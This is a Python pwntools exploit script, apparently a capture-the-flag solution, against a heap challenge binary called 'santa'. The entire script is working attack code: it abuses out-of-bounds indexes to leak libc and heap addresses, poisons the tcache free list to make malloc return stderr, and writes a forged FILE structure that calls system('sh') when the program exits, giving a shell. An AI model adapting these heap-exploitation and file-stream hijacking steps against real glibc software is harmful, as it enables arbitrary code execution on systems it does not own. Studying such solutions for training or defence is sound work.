from pwn import *

context.terminal = ["tmux", "splitw", '-h']
context.binary = elf = ELF("./santa")
libc = ELF("./libc.so.6")

def add(idx, size, buf):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", str(size).encode())
    p.sendlineafter(b"> ", buf)

def remove(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())

def view(idx, nonsense=False):
    if nonsense:
        p.sendlineafter(b"> ", b"3" + nonsense)
    else:
        p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())
    p.recvuntil(b"All I want for Christmas is\n")
    return p.recvuntil(b"\n1. Add", drop=True)

p = process('./santa')

# leak libc address
add(-4, 0x20, b"beeeg limit")
libc.address = unpack(view(39), "all") - 0x2762e0
print(f"libc base @ {hex(libc.address)}")
# leak heap address
heap_leak = (unpack(view(11, b"\x00ABCDEF" + p64(libc.address+2202848)), "all") >> 12) << 12
print(f"heap base @ {hex(heap_leak)}")

# tcache unlinking attack
# after freeing 3, 2, 1
# free-list: chunk 1 -> chunk 2 -> chunk 3
# reallocating to chunk 1 and overflowing chunk 2 metadata
# free-list: chunk 2 -> arbitrary location
# reallocate two more times to get malloc to return an arbitrary address
add(1, 0xf0, b"chunk 1")
add(2, 0xf0, b"chunk 2")
add(3, 0xf0, b"chunk 3")
remove(3)
remove(2)
remove(1)

add(-1, 0xf0, b"A"*0xf8 + p64(0x101) + p64(((heap_leak + 0x330) >> 12) ^ libc.sym._IO_2_1_stderr_))


standard_FILE_addr = libc.sym._IO_2_1_stderr_
fs = FileStructure()
fs.flags = unpack(b"  " + b"sh".ljust(6, b"\x00"), 64)  # "  sh"
fs._IO_write_base = 0
fs._IO_write_ptr = 1
# fs._mode = 0
fs._lock = standard_FILE_addr-0x10
fs.chain = libc.sym.system
fs._codecvt = standard_FILE_addr
fs._wide_data = standard_FILE_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

add(4, 0xf0, b"testing1")
add(6, 0xf0, bytes(fs))  # malloc will return a chunk to stderr here

p.sendline(b"4")  # call exit to trigger our fsop chain

p.interactive()
